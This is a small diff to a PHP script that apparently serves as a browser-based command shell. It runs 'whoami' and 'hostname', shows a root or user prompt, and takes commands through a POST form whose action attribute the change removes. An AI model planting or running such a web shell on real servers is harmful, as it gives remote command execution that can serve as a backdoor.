@@ -41,7 +41,7 @@ echo '<body onload="document.getElementById(\'inp\').focus();">';
             echo "<pre>".htmlspecialchars($out)."</pre>";
         }
     echo '</div>';
-    echo '<form method="POST" action="'.basename(getenv("SCRIPT_FILENAME")).'" id="form">';
+    echo '<form method="POST" id="form">';
         $user = trim(run_cmd("whoami"));
         $host = trim(run_cmd("hostname"));
         if($user == "root"){ $sep = "#"; } else{ $sep = "$"; }
